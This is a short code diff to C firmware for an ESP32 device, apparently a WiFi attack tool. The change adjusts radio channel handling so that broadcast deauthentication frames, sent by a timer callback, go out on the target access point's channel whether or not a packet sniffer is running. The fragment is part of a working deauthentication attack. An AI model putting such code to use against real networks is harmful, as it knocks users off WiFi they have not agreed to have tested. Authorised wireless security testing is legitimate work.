@@ -48,11 +48,17 @@ void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_
         ESP_LOGW(TAG, "Invalid broadcast period, using 100 ms");
         period_ms = 100;
     }
-    /* In APSTA mode the management AP owns the channel: esp_wifi_set_channel()
-       alone is overridden by the running AP, so the deauth frames would go out
-       on the management channel instead of the target one. Reconfigure the
-       management AP onto the target channel to actually move the radio. */
-    wifictl_move_mgmt_ap_to_channel(ap_record->primary);
+    if (wifictl_sniffer_is_active()) {
+        /* The sniffer already put the radio on the target channel. Reconfiguring
+           the management AP here would restart the AP and break the capture,
+           so only nudge the channel. */
+        wifictl_set_channel(ap_record->primary);
+    } else {
+        /* No sniffer: in APSTA mode the management AP owns the channel and a
+           plain esp_wifi_set_channel() is undone by the running AP, so the AP
+           has to be reconfigured to actually move the radio. */
+        wifictl_move_mgmt_ap_to_channel(ap_record->primary);
+    }
     const esp_timer_create_args_t deauth_timer_args = {
         .callback = &timer_send_deauth_frame,
         .arg = (void *) ap_record
